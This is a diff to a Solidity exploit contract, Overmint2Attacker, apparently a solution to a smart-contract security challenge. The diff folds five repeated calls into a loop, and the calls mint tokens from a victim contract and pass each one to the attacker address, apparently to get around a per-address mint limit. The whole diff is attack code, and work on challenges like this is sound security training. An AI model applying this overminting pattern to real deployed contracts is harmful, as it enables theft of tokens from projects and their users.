@@ -14,19 +14,9 @@ contract Overmint2Attacker {
         victim = Overmint2(_victim);
         attacker = msg.sender;
 
-        victim.mint();
-        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
-
-        victim.mint();
-        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
-
-        victim.mint();
-        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
-
-        victim.mint();
-        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
-
-        victim.mint();
-        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
+        for (uint256 i = 0; i < 5; i++) {
+            victim.mint();
+            victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
+        }
     }
 }
